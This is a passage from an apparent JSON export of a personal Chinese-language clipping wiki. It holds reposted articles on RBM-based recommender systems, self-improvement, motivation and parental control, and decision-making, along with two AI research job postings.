于敬）三、如何将RBM应用到推荐系统中本质上来说，RBM是一个编码解码器：将原始输入数据从可见层映射到隐藏层，并且得到原始输入数据的隐含因子，对应的是编码过程；然后利用得到的隐藏层向量在映射回可见层，得到新的可见层数据，对应的是解码过程。而优化目标是希望让解码后的数据和原始输入数据尽可能的接近。在推荐场景中，可以获取到用户对物品的评分矩阵，进过RBM的编码-解码过程处理后，不仅得到了已有评分对应的新评分，同时对未评分的物品进行预测，并将预测分数从高到低排序就可以生成推荐列表。换句话说，就是将RBM应用到协同过滤中。但是这个推荐过程需要解决两个问题：1）RBM中的节点都是二元变量, 如果用这些二元变量来对用户评分进行建模?2）实际业务场景中，用户只会对很少的物品评分，用户评分行为矩阵都是非常稀疏的，那么如何处理这些缺失的评分?Ruslan Salakhutdinov等人首次提出了使用RBM求解Netflix竞赛中的协同过滤问题。对传统的RBM进行改进：可见层使用Softmax神经元；用户只对部分物品评分，而对于没有评分的物品使用一种特殊的神经元表示，这种神经元不与任何隐藏层神经元连接。具体结构如图11所示。图 11 RBM处理推荐问题从图11中可以看到，Softmax神经元是一个长度为K的向量（图中K为5），并且这个向量每次只有一个分量为1，而且第i个单元为1仅当用户对该物品打分为i是才会置为1，其余为0。从而可以得到可见层单元和隐藏层单元被激活的概率：使用前面提到的CD算法，各个参数的学习过程如下：RBM经过学习以后，可以得到整个网络的全部参数。给定一个用户u和一个物品i，预测评分R(u, i)过程如下：1） 将用户u的所有评分作为RBM的softmax单元的输入2） 对于所有的隐藏单元j计算激活概率3）对于所有的k=1,2,…,K, 计算4）取期望值作为预测结果，比如以上RBM只用到用户对物品的评分，忽略了很重要的信息：用户浏览过哪些物品，但是并没有评的情况。条件RBM (Conditional Restricted Boltzmann Machine)对这种信息可以进行建模。图 12 条件RBM处理推荐过程其中r是m维的向量， 为1的话，表示用户对浏览过第i个电影，加入r之后的条件概率：权重D的学习过程：经过前面的分析，对RBM的内部算法原理、编码和解码过程以及在推荐中的应用等有了基本的了解。在推荐业务场景中，一般有两种使用方式：一是进行离线计算，也就是对大量用户都批量计算推荐结果，当然计算量往往很乏；二是将训练号的模型保存下来，然后实时生成推荐结果，也就是排序的过程。在达观推荐架构中，RBM是以第二种方式进行应用中。这种方式避免了大量复杂的离线计算，可以对多种单一离线结果进行融合排序，应用上更加灵活。图 13 达观推荐架构图其实深度学习的很多模型都可以应用于推荐系统，方式也非常多。达观数据精于技术，对于推荐系统和深度学习相结合以持续优化推荐效果的探索也从未停止，后续也会不断地分享相关成果，敬请期待。于敬：达观数据联合创始人，中国计算机学会（CCF）会员，第23届ACM CIKM Competition竞赛国际冠军，达观数据个性化推荐组总负责人，负责达观数据智能推荐系统的架构设计和开发、推荐效果优化等。 同济大学计算机应用技术专业硕士，曾先后在盛大创新院、盛大文学和腾讯文学数据中心从事用户行为建模、个性化推荐、大数据处理、数据挖掘和机器学习相关工作，对智能推荐、机器学习、大数据技术和分布式系统有较深入的理解和多年实践经验。","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"深度学习-Deep Learning","slug":"剪贴板-Clipboard/深度学习-Deep-Learning","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/深度学习-Deep-Learning/"}]},{"title":"思维和习惯","date":"2018-07-20T04:50:18.000Z","path":"wiki/剪贴板-Clipboard/提升自己-Self Improvement/秀的习惯/","text":"一个男生该有哪些优秀习惯？1.自信宏桑在百度任职运营经理五年，后来创业做情感咨询；发现不管是在职场中还是感情中，自卑都是极大的影响因素。职场的晋升=你的实际贡献*你的表达能力，有很多工作踏实的小伙子却不善言辞，面对机会不敢当仁不让，只能恨其不争让他做执行者而非项目管理人；在恋爱中同理，一个对自己的价值都持怀疑的人，面对心仪的姑娘，自然也会患得患失畏首畏尾，在恋爱中彰显劣势。而自信的定义，应该是拥有独立的世界观，且用于践行世界观。而不是人云亦云，活在他人的评价体系当中。2.管理自己的欲望。变得优秀，基本上是所有人的欲望。学业上考上名校，情感上追到喜欢的女神，事业上进入名企身居高位抑或是创业融资直指纳斯达克敲钟，恐怕很多人都幻想过这样的生活。可是即便在用户质量较高，喜欢深度阅读和自我成长的知乎，达成此类成就的，也是少之又少。能把想法转化为执行力的，实在是少之又少。因为尘世间的欲望太多，旅行，健身，摄影，每个爱好做到极致都是优秀；英语，吉他，写字，每个技能练成行家都能有所成就。可是如果你一把抓以上所有好的你一起来，只能把自己玩崩。所谓自律指的就是管理好自己的欲望，不是别人觉得好的你都要追求，选择好自己专精的点去突破。3.长期的坚持。想拥有小蛮腰或者是八块腹肌，想去学一门乐器，想要给自己做精致的早餐，想过种种精致的生活。结果坚持不了几天，还是觉得在床上躺着最舒服，外卖点起来最方便，佛系人生，缘分到了自然会瘦下来。看着别人职场三级跳，也开始提醒自己“不忘初心，砥砺前行”。可是努力加班了一阵子发现也没有明显变化，然后觉得还是按时打卡上班最省心，人生平淡是真。欣羡秀恩爱的情侣，也想着能够秀恩爱；可是又觉得拓展社交圈好麻烦，认识各种陌生人好累，索性不管不顾等着父母介绍相亲。反正“爱情是从遇见某个人开始的”，缘分到了对的人自然会来。以上这几种情况，俗称三分钟热度。知乎上收藏了一大堆【个人成长】【自我提高】标签答案的也不在少数，然后呢？坚持下去了吗？现在你的处境，是三年前的你决定的；三年后你的收入，是现在的你决定的。优秀的人之所以这么说，就是因为能做到坚持的人太少，大多数人所追求的，都是收益极低，但是反馈特别快的廉价快乐。刷了一晚上抖音，一直在哈哈大笑，的确很爽，然后呢？打了一晚上王者，三杀超神的声音瓷器比如，的确很棒，然后呢？相反，那些收益较高的技能，需要长期的积累叠加；刚刚读完一本书就开始纠结”读书到底有什么用“的人，恐怕很难做到优秀。你在三四月做的事情，七八月自然有答案，急什么。4.减少“无效社交”在你的大学校园里，或许总是活跃着这样的“社交达人”他们擅长跨年级跨专业结识人脉，相比一般同学，在校园环境中可以斡旋到更多资源，小到各个圈子的K歌桌游party局，大到参与各个社团学生会的活动，你都能看到社交达人的身影。你可能也会三不五时地被灌输一些概念：书本里枯燥的知识没有用，只有学会社交的人才能赢得未来。但其实多数的校园社交属于“无效社交”在职场，尤其是北上广深的职场，人与人之间的交往，本质上是价值的互换。文艺点来说，叫做“你若盛开，蝴蝶自来”。直白点来说，叫做在自我提高的路上，你的社交凭证往往不是因为你长袖善舞，而是因为你能提供给别人相应的帮助。所以，如果你社交的目的是“有用”“锻炼能力”，那么直白点来说，那些跟大学好友深夜喝酒撸串畅谈人生的片刻，毫无卵用。去用这些时间，把你们学校图书馆里的资源利用起来，or学习一些常用工具如PS或自媒体运营，远比这来得有效。5.学会独处20岁的时候荷尔蒙分泌旺盛，躁动不安的同时时常会感到孤独，因此特别渴求沟通，特别渴求存在感。不管是在知乎抖机灵回答问题回复别人，还是在各个社交网站上po出自己的自拍照心情语录，都是通过社交来获取存在感的方式。但其实漫长的人生中，孤独往往是常态，你总要学会驾驭孤独，甚至享受孤独，才能在孤独当中思考清楚：自己究竟想成为什么样的人。6.学会管理自己的情绪。做情绪的主任，不要做情绪的奴隶。小孩子可以开心了就笑，不顺心了就哭，玩输了游戏满地打滚，因为灵智未开。20岁之前，能看我们欢喜悲伤的，往往是身边的挚友，他们会更大概率包容我们的真性情20岁之后，留给我们失态的机会和空间会越来越小。不要因为沮丧，就觉得一切毫无意义，丧失了走下去的动力；不要因为愤怒，就口不择言，说出一些无可挽回的话。hold住自己的情绪，其实就是成熟的标志。7.不要释放负能量我之前总会碰到这样的年轻人，不管你说什么，他总会说“没有啊”“你说的不对”“我认识一个人，就不是你说的那样”，他们对世界充满着戾气和负能量，他们质疑着，排斥这，他们说自己没有女朋友都怪现在的女人太拜金，他们说自己没有钱都是因为现在阶级分化严重，不给穷人机会。是的，社会压力很大，生活很疲惫，这我们都知道，但是相信我，压力已经这么大，没有人喜欢跟一个满腹牢骚的人在一起。宏桑曾经担任过hit的校辩论队队长，也在北京辩论圈拿过一两个冠军，但我深知生活不是辩论赛，没那么多非黑即白的真理，大多数情况下，人们无法互相说服，只能通过辩论互相厌恶。8.提高执行力，告别拖延症我很喜欢nike的一句广告语“Yesterday you said Tomorrow ”年轻的我们大多数经历过这种三分钟热度，看了一个励志电影，读了一段热血文字，觉得自己要在此刻为自己搏出一个未来。可书没翻两页，单词没记住几个，就立马觉得疲惫和匮乏：哎呀好累，要么先刷会儿微博休息下。大多数时候，我们的行动力需要外部激励，不好好学习就会挂科，杀掉这个怪物马上就会获取经验值，这种直接而快速的惩罚或奖励机制促使着我们行动，但是看一本书，跑一小时步这种漫长时间才能获取收益的行为，会导致我们的拖延症。9.信息爆炸的时代，多汲取有效信息移动互联网和自媒体给我们带来了一个信息爆炸的时代，如果你愿意，通过微博，综艺节目乃至知乎，你可以一天获取大量的信息，你可能会为某个剧集放肆大笑，为某篇文章动情哭泣，但如果你不知道自己需求的有效信息是什么，你无法从这些碎片信息中学到任何东西。除了娱乐之外，试着多去看一些通识类的内容，比如金融，比如互联网，比如法律等，知识总会让你成长。它可能不会给你的感官带来最直接的刺激，但是有用。最后，一段王小波的话送给现在或许焦虑的你。每次阉牛我都在场。对于一般的公牛，只用刀割去即可。但是对于格外生性者，就须采取锤骟术，也就是割开阴囊，掏出睾九，一木锤砸个稀烂。从此后受术者只知道吃草干活，别的什么都不知道，连杀都不用捆。掌锤的队长毫不怀疑这种手术施之于人类也能得到同等的效力，每回他都对我们呐喊：你们这些生牛蛋子，就欠砸上一锤才能老实！按他的逻辑，我身上这个通红通红，直不愣登，长约一尺的东西就是罪恶的化身。 当然，我对此有不同的意见，在我看来，这东西无比重要，就如我之存在本身。天色微微向晚，天上飘着懒洋洋的云彩。下半截沉在黑暗里，上半截仍浮在阳光中。那一天我二十一岁，在我一生的黄金时代。我有好多奢望。我想爱，想吃，还想在一瞬间变成天上半明半暗的云。后来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。可是我过二十一岁生日时没有预见到这一点。我觉得自己会永远生猛下去，什么也锤不了我。 为什么毕业三四年之后，同学之间的差距会越拉越大？ 一、眼光短浅的人，混得不会太好。我们院里有个王阿姨，挺能干的，别人谁都夸她做的棉被好，对了，忘说了，她经营着一家棉布店，每天都做活，而且很忙碌。按我这么说，她其实日子过得应该很不错。其实并没有。刚够吃喝，房子也很多年了，也没装修，甚至不如一般普通家庭，想换个大的店面，也一直没换成。她家总是挣钱了就去还债，儿子呢，也调皮，总是也惹事，她到处给别人赔钱。她曾经还去算命，算命先生说她财运不错但就是八字太凶，容易破财，所以才过得不好。直到2014年，我听闻她儿子应该跟别人在烧烤摊上打架，把别人打得很严重，入狱了，我才慢慢懂得为啥她会过得不好。她孩子从小聪明，但就是调皮，老师总是叫她去，让她回家多看管，做好家庭教育，但她总说自己活很多，没时间管，管孩子不就是老师的事嘛，不然要老师干嘛。她老公常年在深圳打工，所以她孩子也就成了我们院的野孩子，没人管，“自由生长”。而她的破财事件，其实都有迹可循，锁坏了，顾不上修，所以就进了贼，干活太累顾不上吃饭，就得了胃病，花更多的钱买药，腰也不好，关节还疼……所以呀，她的苦命，不是因为什么八字，而是只顾着眼前，不顾了长远。而很多大学生刚毕业很会犯这个毛病，只顾着眼前起薪高，却不顾着这个行业的发展前景，这个团队和这个boss是否合得来。慢慢地，就差开了差距。所谓人无远虑必有近忧，一个人如果眼光太短浅，命不会讨好你。二、真正拉开差距的是那些“重要不紧急的事”。学过管理学的人都知道四象限理论：紧急重要，紧急不重要，不紧急重要，不紧急不重要。这四类事情顺序安排妥当，你的人生过的不会差。紧急且重要的事，如毕业论文，重病住院，业务谈判，这些需要立马去做。不重要不紧急的事，比如追剧，玩游戏，一般都是可做可不做。让我们意乱神迷的往往是“紧急不重要”和“重要不紧急”的事。紧急不重要的事，如闺蜜喊你逛街，手边突然扔过来一份资料需要改动。重要但不紧急的事，如读书，跑步，学一项新技能，陪伴孩子。然而，我们普通人，大多都是放下了重要不紧急的事，去忙紧急不重要的事。如果你总被紧急的事拖住后腿，忽略了重要的事，那么如此以往，重要的事就会慢慢变得特别紧急，到时候你就得花很大的代价去弥补。或者，都弥补不了。所以重要但不紧急的事，决定了毕业后三五年同学人生的质量和高度的关键因素。三、别做那个一直锯木头的人。咋判断一个事是“重要不紧急”还是“紧急不重要”呢？那就是想一下，这个事对你十年后的人生有没有影响。比如，大学周末兼职，虽然能赚点小钱，但是这个钱，对于十年后的人无足轻重。考四级考六级，考驾照，会对你工作，生活有很大影响。多接待一个客户，多做一单生意，多挣一份钱，十年后，这份钱对自己没多大意义。保护健康，教育孩子却影响你一生。所以，腾出更多时间，去多做一些关系长远，真正的大事，去读书，去锻炼，去提升技能，这样你人生前半段会艰难，但是后半段会很轻松。有个故事，说是一个人费力锯木头，旧的没据完，新的就送来了，越来越多，不断加班。别人提醒他，你的锯子太钝了，磨磨吧！他说，活都干不完，没时间磨。朋友问，那你啥时候磨呢？他说，等我锯完再磨。所以说，我们一定别做这个锯木头的人。磨刀不误砍柴工。 无力感 | 明明知道该努力了，可就是无法行动，到底是为什么？1. 为什么明明知道该努力了，可就是无法行动？ 因为你的【动机】，被父母【偷】走了。什么意思呢？ 我们先来看一个思考题：【例】已知：小明放假回家，打算先歇三天，再开始学习。因此，头三天，他每天都睡到自然醒，醒来就刷刷手机，玩玩游戏。到了第四天早上，小明醒来时，心想：“嗯，我休息的差不多了，接下来该好好复习英语了。好，就这么干，今天我就起床收拾一下屋子，然后开始复习英语。”正当小明这么想着的时候，妈妈突然开门闯进来，指着瘫在床上的小明一顿痛骂：“小明！你看看你，放假回来你就彻底放羊了是吧？也不收拾屋子，也不早睡早起，也不学习，你再这么躺下去你就废了知不知道？ 赶紧给我起来，把房间收好，开始学习！”求：如果你是小明，你此刻会有怎样的感受？你内心原本想要“收拾房间，好好学习”的动机，是变得更强了，还是更弱了？—— 如果我是小明，此刻我会感觉到非常委屈，非常无力，非常抗拒。原本我还想站起来去做，可是妈妈这么一催，我反而什么都不想做了。为什么会这样呢？因为：小明的【动机】，被妈妈【偷】走了。怎么偷的呢？原本，我想做一件事，我有自己的节奏，我有自己的规划。我会按照自己的步调，一步一步地，努力地做完这件事，这会让我很有成就感，这样一来，我就会更加愿意做这件事，形成一个良性循环。而现在，我的节奏被你打断了。你根本不了解我的节奏，不了解我脑海里的规划，你就这么粗暴地默认我是没有能力为自己负责的，然后你就指责我，催促我，逼着我去做。在这种情况下，即使我勉强站起来去做了这件事，我也得不到成就感。因为我会觉得，我被你控制了，被你威胁了，我为了让你满意而不得不去做这件事。我体会不到“我”在这件事中的意义。我不愿意被人用枪指着，我不愿意当别人的奴隶。没有人喜欢被控制。所以，我的动机变弱了，我现在不想做了。——这，就是我们“明明知道该努力了，可就是无法行动”背后的心理原因。不是我不努力，而是我的动机被干涉了，我在这件事上的主动权被别人偷走了。2. 控制型父母，特别容易培养出无力型孩子。如果你的父母恰好是控制型，你可能会经常在和父母的互动中体会到这种无力感。比如，小时候，雨天地上有积水，你想去踩踩那摊积水，你想体验“踩水”这种感觉，这时，妈妈在旁边说：“不许踩水坑，多脏啊！快回来！”—— 这里，你就积累了一个“无力感”的体验。比如，逛街时，你想试穿一件粉红色的大衣，你想体验打扮成小淑女的感觉，这时，妈妈在旁边说：“不买浅色大衣，不耐脏！”—— 这里，你又积累了一个“无力感”的体验。再长大些，你迷上了读小说，你开始尝试写一些诗文，小说，试着寄给杂志社，你隐隐约约地想着：“或许，我长大可以当一个小说家”。这时，妈妈在旁边说：“做梦！你根本没那个天赋！再说了，搞文学的圈子太乱，不安全，收入也不稳定，你一个女孩子，还是要好好找一个正经工作嫁人才是正道。”——这里，你又积累了一个“无力感”的体验。你的无力感，就是这样，一斤，一斤，又一斤地累积起来了。积的多了以后，你的心，就变成了一摞麻木的稻草，你再也无法对什么东西产生长久的兴趣了，你再也提不起劲儿去追求什么了。3. 如何摆脱无力感？前面我们分析了无力感的由来，那么读到这里，你一定会想知道：“如果我不想再继续这种陷入无力感的状态，我具体该怎么做呢？”首先，我们要打破父母的控制。父母偷走了你的动机，那你现在就把本该属于你的动机夺回来！具体如何操作呢？使用索取法。向父母索取【正面反馈】。父母对你提要求，你也反过来给父母提要求。在形式上把主动权先夺回来。比如，在前面的例子中，当妈妈对你说：“你看你一放假回家，就不收拾房间不学习……赶紧起来给我收拾！”这时候，你就马上嬉皮笑脸，用撒娇的语气对妈妈说：“好呀妈妈，我现在就打扫，那我等会儿打扫完了，你要夸我一句宝贝真棒！”学会向父母索取【正面反馈】，这个【正面反馈】可以是一句称赞，可以是亲亲抱抱，可以是一个自豪地笑容，也可以是给你做顿好吃的等等。这样，你就把本属于自己的动机又拿回来了，主动权就重新回到了你自己手上。那么读到这里，你可能会说：“那这样岂不是变成我为了得到父母的夸奖而打扫卫生吗？这样也太幼稚了吧？” 针对这一点，我想告诉你的是，这一点都不幼稚，这是你应得的。一个孩子所做出的每一分努力，都值得被看到，被鼓励，被认可。孩子的努力，本就应该得到父母的正面反馈，这是父母本该尽的教育义务。但有些父母却做不到这一点：孩子努力去做，做的好了，那是孩子应该的，父母也不会给一句正面反馈；孩子做的不够好，那就是孩子大逆不道，父母这边马上给出各种指责打击贬损（负面反馈）。那孩子就会知道：无论我努力与否，横竖都是得不到父母的肯定，那我还有个屁动力啊！这样下去，孩子的努力动机就会越来越被弱，最后干脆瘫在那里不动了。所以，向父母索取正面反馈非常有必要，这一点都不幼稚。正面反馈，本就是父母应该给予你的东西，这是他们欠的作业，现在也该补回来了！4. 如果我索取正面反馈，父母不配合呢？如果真的遇到这种情况，那么我们可以试试感受法+需求法。用平静的语气，如实地告诉父母我们此刻的感受，和我们内心深处真正的需求。措辞参考如下：“妈妈，你知道吗？其实，刚才在你走进来之前，其实我心里已经决定今天要起来收拾房间开始学习了。只是，被你抢先一步说了，如果我现在说我当时真是这么想的，估计你也不会相信了。这种感觉让我觉得很难受，很难受。妈妈，其实我也想努力去做些事情，我也想变得优秀，让你感到骄傲。可是，在之前这二十多年的人生中，我感觉好像不论我再怎么努力，却总是无法让你满意，这让我感觉真的很无力。妈妈，也许我以前确实有很多地方做的不够好，让你失望了，比如我去年放假回家就一直贪玩，作业都是到最后几天才赶出来的，比如我这次英语四级又没考过，这些可能都会让你对我失去信心。我对自己也感到很失望，很自责，我也想做点什么来向你证明，我不会一直这么堕落下去的。可是我很担心自己即使努力了也做不好，我担心即使这次好好复习英语了，最后六级还是没考过，又让你失望。我现在很害怕考试，真的，因为我太怕失败了。我怕我再失败一次，你就彻底不爱我了。我真的特别特别需要你给我一些信心，给我一些鼓励和支持，虽然我不知道最后的结果会怎样，但是我真的想先行动起来，哪怕我只往前拱了一小步，我也希望你能看到我的努力，并且给我一个正面反馈，让我知道自己的努力是可以让妈妈感到开心的！我真的非常非常需要这个！妈妈，你能理解我的需要吗？你可以帮帮我吗？”—— 大致如此，用平静的语气，如实地表达你内心的感受和需求，告诉父母，你内心担心什么，害怕什么，渴望什么，需要什么。如果你面对父母难以说出口，那就写下来给他们看也可以。只要你的父母大体上是爱你的，是希望你越来越好的，那么听到你这么说，他们绝对会发自内心地愿意配合你，给予你正面反馈。只有在【感受层面】和父母进行沟通，他们才能真正地理解你的感觉，他们才会知道自己以前的做法对你的情绪造成了怎样的影响，他们才会发自内心地愿意去反省和改变。从【正面反馈】开始，和父母重建关系吧。这次，我们建立一个良性循环的关系。父母，是孩子的根。和父母的连接若是断了，阻塞了，那我们的生命力就也会被堵住，无法发挥出自己的潜能，不敢放开手脚去绽放自己的生命。只有我们和父母的关系通畅了，我们的生命之树才能源源不断地获得滋养，获得肯定，获得祝福，这棵树才能越长越高，发展出枝繁叶茂的成就。这一切，都要从【正面反馈】开始。补5. 即使平静地表达感受，父母仍然不理解，该怎么办？有些朋友留言说，即使我平静地向父母表达感受，父母仍然不理解我，那该怎么办？如果你都做到这一步了，父母仍然不理解你的话，那么说明你父母的心理能力目前还无法承受“和孩子沟通”这件高级的事情。那就先暂停与父母沟通，进入自我保护模式吧。减少和父母的接触面积，把有限的时间精力用在增加自己的核心价值上。能不在家待，就别在家待，去咖啡馆学习，去付费琴房学习，去市民图书馆学习。健身班，学车班，英语班，随便报个什么班，哪怕在那个班上看课外书也可以。只要别在家待。原理情绪的干扰源（父母）。把力量放在自己身上，攒自己的核心价值，尽快实现经济独立和生活独立，和父母划分边界，这样也可以摆脱父母的控制。你的实力越强大，父母对你的控制力就越弱。最后祝大家：摆脱控制，活出自己。【end】关注我的公众号【巴赫爱喝胡辣汤】，收藏更多情绪管理干货。封面人物：宫崎葵。","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"提升自己-Self Improvement","slug":"剪贴板-Clipboard/提升自己-Self-Improvement","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/提升自己-Self-Improvement/"}]},{"title":"招聘信息（重点关注对发表论文的要求）","date":"2018-07-20T04:45:43.000Z","path":"wiki/剪贴板-Clipboard/学术界-Academic Area/招聘信息（重点关注对发表论文的要求）/","text":"淘宝技术部－商业机器智能团队算法招聘帖 联系人：黄健敏， 邮箱：caiqiong@alibaba-inc.com， 电话：18667179057 商业机器智能团队招聘，招聘JD如下，如有意向，按以上方式联系： 团队介绍 在淘宝技术部商业机器智能算法团队工作，在这里你将要解决的问题包括（但不限于）面向商家端的智能决策系统、面向用户端的商品、feeds、短视频的挖掘及推荐系统以及基于移动智能设备的AI平台算法，这不仅要考虑CTR（点击率）、成交额、用户日活等业务指标，还需要系统化的解决上千万卖家流量博弈的机制设计，团队内的算法工程师和科学家将与你一起解决世界上规模最大电商平台上最困难的业务技术难题。 参与淘宝核心场景的算法研发，提升场景的点击率、转化率、成交、停留时长等核心指标； 设计面向On Device AI的高容错分布式机器学习系统及新的模型； 构建面向电商领域的知识图谱； 面向大淘宝千万卖家的生态机制算法设计。 工作城市：杭州、北京均可。 职位描述 计算机或者相关专业本科以上学历； 1年以上策略算法工作经验；（社招要求，校招不限） 熟练掌握Java/C++/Python中至少一门语言； 如果你还满足以下要求，我们会优先考虑（社招要求，校招不限）： 计算机科学硕士/博士学位，有推荐系统、机器学习、信息检索、数据挖掘、计算广告学及算法博弈论相关领域研究及实践经验； 在WSDM、ICML、SIGKDD、NIPS、RECSYS、WWW、ACL、EC等相关国际会议上有文献发表； 有1年以上大规模分布式机器学习系统开发经验； 有企业级搜索、推荐系统、自然语言处理算法优化经验。 Inception Institute of Artificial Intelligence Research Scientists/Senior Scientists/Lead Scientists/Principal Scientists/(Senior) Engineers&nbsp; PositionsThe Inception Institute of Artificial Intelligence (IIAI) is the UAE’s national research&nbsp;organisation, which aims for breakthroughs in fundamental and applied AI research. Multiple vacancies of&nbsp;Research Scientists/Senior Scientists/Lead Scientists/Principal Scientists&nbsp;and (Senior)&nbsp;Engineers&nbsp;are available.Objectives Publish prolifically at top-ranking AI conferences and in leading AI journals as a premier thought leader. File actively for AI technology and AI-related patents on a global scale. Promote heavily the transferability of our research findings and engineering results. Participate in advising the national government and support its oversight of the entire AI ecosystem in the country.&nbsp;LocationOur office is situated in the central business area of Abu Dhabi, within walking distance of shopping malls, various restaurants, the Cleveland Clinic that offers the world’s best healthcare and multiple sea view luxury residential blocks. Being the home to 175 nationalities, the UAE provides an open-minded and hospitable living and working environment to all expats. From clothes to cuisines, in the UAE, you can always find the humblest and the most extravagant.&nbsp;Minimum requirements PhD degree in Computer Science, Data Science, Mathematics, Statistics or related streams. Proven experience in Computer Vision, Machine/Deep Learning, Natural Language Processing, Data Mining, Multimedia, Medical Imaging, Bioinformatics or related fields. Strong publication record at conferences and in journals, such as TPAMI, IJCV, NIPS, ICML, ICCV, CVPR, ECCV, ICLR, KDD, ACL and MICCAI.&nbsp;Benefits A highly motivating position that will drive you to broaden your horizon and learn from senior peers. Freedom of academic research without the pressure of grants and teaching in academia. Huge amounts of data across the country that can help you fulfill and fast-track your research into real-world scenarios. A GPU farm of 100 NVIDIA DGX-1 servers and other GPU machines (1000 Tesla V100 GPUs). An enjoyable modern working environment with a spectacular sea view. World-leading standard of healthcare, education and hospitality industry. All year round sunshine and amazing beaches. Extremely competitive package (tax-free salary). APPLY NOW &lt;/div&gt;","tags":[],"categories":[{"name":"剪贴板-Clipboard","slug":"剪贴板-Clipboard","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/"},{"name":"学术界-Academic Area","slug":"剪贴板-Clipboard/学术界-Academic-Area","permalink":"http://yoursite.com/categories/剪贴板-Clipboard/学术界-Academic-Area/"}]},{"title":"普通人如何通过训练大幅提高自己的决策能力？","date":"2018-07-20T03:52:47.000Z","path":"wiki/剪贴板-Clipboard/提升自己-Self Improvement/通人如何通过训练大幅提高自己的决策能力？/","text":"我推荐一个方法，很简单但很好用，就是不断地复盘。 「复盘」这个词最早来源于棋类术语，也称「复局」，指对局完毕后，复演该盘棋的记录，以检查对局中对弈者的优劣与得失关键。每天「打谱」，按照棋谱排演，有效地加深对这盘对弈的印象，也可以找出双方攻守的漏洞。 复盘被认为是围棋选手增长棋力的最重要方法，尤其是自己和高水平者对弈时，可以通过他人的视角看到自己思考不足的地方，从而将别人的经验化为己用。围棋棋手的训练方法很简单：不断下棋，简单复盘，日复一日，年复一年。方法最单调但也最有效。通俗来说，复盘就是把当时「走」的过程重复多遍，并且主动思考为什么这么「走」，下一步应该如何设计，接下来的几步该怎么走。从棋阵来看，复盘是攻守结合的切磋，从心理战来看，能更好地对比双方的心理思维，最终总结出所谓的「套路」。当「套路」熟捻于心，就自然能达到高手的境界了。——柳传志《我的复盘方法论》具体而言，可以分为这样几个步骤：第一步，回顾目标并和结果对比：回顾一件重大的决策中，你做了哪些事？和开始的目标之间有什么不一样？第二步，评估所做的事情：评估每件事的价值，到底哪一步是关键步骤？第三步，发掘规律，寻找共性：有哪些原则或者经验可以从中学到？有哪些其他的案例或者书籍对这样的决策有帮助？第四步，总结反思：有哪些可以提升的地方？如果再面临这类问题，如何决策？复盘最直接的，就是磨练我们的思维能力，并且最大限度地防止我们在同一个地方犯错误——这绝对是决策能力最大的体现。如果你做一件事情失败了，一定不能只得到“我失败了”或者“我不适合这项任务”的结论，而是要知道，到底是哪一项具体的原因构成了失败：心理因素？信息不足？还是没有实战经验？如果每一个因素都有，也不能鱼龙混杂地分析，更要精确到具体的事项，了解究竟是哪一步出现了问题——就像围棋落子一样，确定地知道，是哪一步棋走得不够好，并且这样还不够，还要知道，要怎么走才好，这样反复去思考，清楚地了解到所有可能被遗漏的细节。除了提升决策能力之外，让我们更有效地分配我们的决策能力。很多人可能没有意识到的是，我们往往在做一些重大决定（如买房，结婚，择业）的时候，并没有给予和这件事重要性匹配的关注。就拿结婚来说，我曾经做过婚礼司仪，和新郎新娘聊天时发现，有一些人在准备婚礼各项事宜（重要事项）花费了两个月，但是相亲到确定对方是另一半（极端重要事项），只见了五次面；很多人在升学选择学校（极端重要事项）的时候，决定因素仅仅是一份不知道哪里来的学校排名，但决定晚饭去哪一家餐厅（中低等重要事项）的时候，却翻遍了某app里所有评论；我们对待不同事情所花费的决策精力大致就像上面这张图所示。对于中等重要的事情，往往我们会大幅提高我们的精力去处理，比如一个策划案，比如一顿重要的晚宴。其原因是在做这些决策时，我们明显可以看到即时收益，强大的即时反馈让我们知道，花更多的精力来做这个决策是有价值的。我们很擅长做这样的决定：如果明天就要考试，那么现在熬夜通宵是值得的；也很擅长做这样的决定：今天这封邮件不发给老板可能会被骂，虽然现在去发邮件让我很不爽，但是相比于被骂，现在发邮件还是值得的。但是遗憾的是，很多重要的决定并非是即时的。我们看不到，这一刻深思熟虑地交一个挚友可以带给我们什么样的帮助；我们也不知道，多思考一下“这份职业适不适合我”是不是就可以提升薪水；我们更无法量化，如果多反思10分钟“最近一个月的工作有什么不足和可以改进之处”可以带来什么收益。我们绝大部分人都天生不擅长这种长逻辑链的思考，只有简单的因果（我做了A决定→得到了B收益）才会激发我们的决策欲望。所以，有时候不是决策能力有问题，而是根本没有用上足够多的时间和精力去做决定。而造成这样的原因是：我们无法把一件复杂的决策拆分下来，清楚了解到我们每一步行为的价值。复盘在这个时候也就相当重要。在做完一件事，尤其是一眼望不透的事的时候，重新回顾，重新肢解每一步的行为，确定他们的价值，并总结经验。通过许多次这样的复盘之后，能逐渐建立起一些关系链条很复杂的事情之间的联系，从而优化自己的决策能力这项资源的配置。决策能力提升+决策能力的利用效率提升，这绝对是很实在的方法。 特别认可的一句话：人生最浪费时间的三件事judge, hesitate and regret。总结起来全是和选择或决策相关的，分别对应决策前、决策中和决策后。由此可见决策能力对人生影响之巨大，难怪题主会有这样的问题以及面对如此众多的优秀答案。要想提高决策能力，就我的经验而言就两条：在非重要决策上节省精力+不纠结。巴菲特曾说，犯错少就是成功，特别是回避那些影响重大的弱智决策失误。但是许多人却每天处在不断决策各种琐事上面，比如：午饭去哪里吃、如何点菜、如何定航班、是否参加某个会议、在同时发生的两个社交活动中如何抉择等等。如果一个人每天可用于决策的脑力是有限的，那么在无关紧要的决策上花费的脑力太多，就会影响在重要决策上的脑力投入，从而降低决策质量。曾经看见一个大佬级人物，为了一个并不重要的内部会议，和行政总管详细讨论酒店的安排计划，争取达到质量和价格的最优结合（不得不叹服该大佬的精力之旺盛以及潜力之巨大）。要在非重要决策上节省精力，自己总结的套路有三。找到如下三类事件，按照如下各自的解法，能简化大部分问题。找到出无需费神的决策，如日后遇见则用最简单甚至是随机的办法处理，比如：吃饭地点、打发时间需要看的电影等等。找到合适的人在合适的时间帮助自己在合适的问题上做决策。回到上面关于大佬的例子，集中做一次性决策找到一个靠谱的行政总管并舍得花钱聘用之，一劳永逸，而避免浪费浪费自